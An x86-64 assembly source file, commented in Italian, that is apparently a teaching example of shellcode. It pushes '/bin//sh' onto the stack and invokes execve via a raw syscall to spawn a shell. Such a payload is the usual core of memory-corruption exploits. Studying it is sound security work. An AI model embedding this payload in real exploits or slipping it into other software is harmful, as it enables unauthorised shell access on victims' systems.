        section .text
        global _start
_start:
        ; Per un elenco delle systemcall con gli argomenti nei registri: https://syscalls.w3challs.com/?arch=x86_64
        ; Siccome uso una execve, la funzione chiamante non ritornera` ad eseguire le sue operazioni
        ; (a meno che execve ritorni erroneamente)
        mov rax,0x3B        ; 0x3B il codice della execve
        xor rdx,rdx         ; \0 ad envp
        xor rsi,rsi         ; \0 ad argv
        push rdx            ; \0 che mi indica la fine della stringa
        mov r10,"/bin//sh"  ; Metto in un registro temporaneo la stringa. (// per arrivare a 64 bit)
        push r10
        mov rdi,rsp         ; Metto in rdi il puntatore a "/bin//sh\0"
        syscall
        ; Non dovrei essere qui
        add rax,-1           ; Ritorno un errore
        ret
